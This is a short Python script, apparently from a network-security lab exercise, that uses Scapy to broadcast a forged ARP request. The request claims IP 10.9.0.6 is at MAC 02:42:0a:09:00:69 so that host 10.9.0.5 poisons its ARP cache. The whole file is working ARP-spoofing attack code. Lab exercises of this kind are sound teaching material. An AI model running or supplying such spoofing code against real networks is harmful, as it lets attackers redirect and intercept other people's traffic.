#!/bin/env python3

from scapy.all import *

a_ip    = '10.9.0.5'
map_ip  = '10.9.0.6'
map_mac = '02:42:0a:09:00:69'

eth = Ether(dst='ff:ff:ff:ff:ff:ff')
arp = ARP(pdst=a_ip, psrc=map_ip, hwsrc=map_mac)
arp.op = 1 # request: 1, reply: 2
sendp(eth/arp)
